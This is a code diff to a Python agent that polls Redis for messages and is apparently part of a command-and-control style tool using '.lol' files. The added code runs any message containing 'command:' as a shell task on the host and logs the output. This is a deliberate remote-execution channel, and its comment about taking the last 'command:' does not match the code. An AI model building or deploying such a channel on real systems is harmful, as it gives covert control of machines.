@@ -74,6 +74,32 @@ def get_new_msgs(
     return msgs
 
 
+def get_new_cmd_results(
+    redis_con: redis.Redis, delete_msgs: bool = False
+) -> list[dict]:
+    """
+    Get new command results.
+    """
+    task_ids = redis_con.smembers(tasks.REDIS_COMPLETED_CMDS_KEY)
+    redis_con.delete(tasks.REDIS_COMPLETED_CMDS_KEY)
+    results = []
+    for task_id in task_ids:
+        res: AsyncResult = AsyncResult(task_id)
+        if not res.ready():
+            continue
+
+        if delete_msgs:
+            # there's a nonzero chance it's actually not finished by this point,
+            # which is why this comes after the ready() check
+            redis_con.srem(tasks.REDIS_COMPLETED_CMDS_KEY, task_id)
+
+        if res.status == "SUCCESS":
+            results.append(res.get())
+        else:
+            logger.warning(f"Task {task_id} did not complete succesfully; check logs")
+    return results
+
+
 def get_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Creates and verifies .lol files.")
 
@@ -103,6 +129,7 @@ def main(cfg_obj: cfg.Config, app: celery.Celery) -> None:
     while True:
         try:
             new_msgs = get_new_msgs(util.get_redis_con(app), delete_msgs=True)
+            new_results = get_new_cmd_results(util.get_redis_con(app), delete_msgs=True)
             if not redis_connected:
                 logger.info("Successfully connected to Redis")
                 redis_connected = True
@@ -110,6 +137,14 @@ def main(cfg_obj: cfg.Config, app: celery.Celery) -> None:
             logger.warning("Couldn't connect to Redis, retrying in a second")
             time.sleep(1)
             continue
+
+        if new_results:
+            for r in new_results:
+                stdout = r["stdout"]
+                stderr = r["stderr"]
+                logger.info(
+                    f"The command {r['cmd_str']} completed ({r['start_time']}-{r['end_time']}): {stdout=} {stderr=}"
+                )
 
         if not new_msgs:
             logger.info("No new messages, sleeping for 5s")
@@ -119,16 +154,31 @@ def main(cfg_obj: cfg.Config, app: celery.Celery) -> None:
             # Do something with the message using the command module for the agent.
             # For now, let's just reverse the message and write a response message
             # for each one
-            new_data = msg.data[::-1]
+            if not msg.data:
+                logger.info(f"Skipping {msg}, data was absent")
+                continue
 
-            new_msg = messages.AgentMessage(
-                message_type=messages.MessageType.CMD_RESPONSE,
-                initiated_by="agent",
-                data=new_data,
-            )
+            if b"command:" in msg.data:
+                # Run it as a command - take the last instance of command:
+                # obviously this is dangerous but that's the point lol
+                logger.info(f"Received message with command directive: {msg.data!r}")
+                try:
+                    cmd_str = msg.data.decode("utf-8")
+                    tasks.execute_command.delay(cmd_str)
+                except UnicodeDecodeError:
+                    logger.error(f"Failed to decode {msg.data!r} as Unicode string")
+            else:
+                # Fallback: just reverse the input so we know it actually works
+                new_data = msg.data[::-1]
 
-            logger.debug(f"Writing new message {new_msg}")
-            tasks.write_msg.delay(new_msg, cfg_obj)
+                new_msg = messages.AgentMessage(
+                    message_type=messages.MessageType.CMD_RESPONSE,
+                    initiated_by="agent",
+                    data=new_data,
+                )
+
+                logger.debug(f"Writing new message {new_msg}")
+                tasks.write_msg.delay(new_msg, cfg_obj)
 
 
 if __name__ == "__main__":
